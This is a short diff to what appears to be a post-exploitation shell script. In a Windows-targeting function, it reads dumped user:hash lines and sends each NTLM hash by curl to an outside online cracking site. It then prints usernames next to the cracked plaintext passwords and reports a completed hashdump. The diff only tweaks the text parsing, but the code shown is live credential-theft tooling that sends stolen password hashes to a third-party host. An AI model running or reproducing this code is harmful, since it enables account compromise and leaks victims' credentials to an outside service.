@@ -68,8 +68,8 @@ function Windows() {
 		while read hashd; 
 		do
 			users=$(echo ${hashd} | cut -f1 -d":")
-			plop=$(echo ${hashd} | sed 's/://g' | grep -o '.\{32\}$' 2> /dev/null)
-			decrypt=$(curl --data "hash=${plop}&decrypt=Décrypter" -s http://md5decrypt.net/Ntlm/ | sed 's/<[^>]*>//g' | grep ${plop} | awk '{print $3}' | rev | cut -c 8- | rev 2> /dev/null)
+			plop=$(echo ${hashd} | sed 's/://g' | grep -o '.\{32\}$')
+			decrypt=$(curl --data "hash=${plop}&decrypt=Décrypter" -s http://md5decrypt.net/Ntlm/ | sed 's/<[^>]*>//g' | grep ${plop} | awk '{print $3}' | sed 's/.\{6\}$//g')
 			printf "${users} : ${decrypt}\n"
 		done < ${base}/hash.txt
 		printf "\n[+] Complete ${GREEN}hashdump${NC} in ${RED}${base}/hash.txt${NC}\n"
